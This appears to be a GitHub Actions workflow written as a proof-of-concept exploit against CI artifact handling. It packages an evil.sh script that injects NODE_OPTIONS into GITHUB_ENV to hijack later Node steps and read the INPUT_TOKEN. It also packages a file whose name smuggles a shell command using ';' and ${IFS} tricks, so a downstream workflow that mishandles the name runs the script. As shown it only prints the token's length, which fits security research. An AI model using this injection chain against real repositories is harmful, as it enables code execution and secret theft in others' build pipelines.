name: Tests

on:
  workflow_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: make artifact
        run: |
          mkdir -p out
          printf '1' > out/pr_number.txt
          printf 'benign content\n' > out/readme.txt
          cat > out/evil.sh <<'SH'
          #!/bin/bash
          echo 'console.log("LEAK_INPUT_TOKEN len="+(process.env.INPUT_TOKEN||"none").length)' > /tmp/x.js
          echo 'NODE_OPTIONS=--require /tmp/x.js' >> "$GITHUB_ENV"
          echo 'PREPARE_STEP_RAN_AS '$(id -un)
          SH
          printf 'x' > 'out/readme.txt;P=${GITHUB_WORKSPACE:0:1};bash${IFS}${P}tmp${P}content${P}content${P}evil.sh;#.txt'
          ls -1 out
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: out/
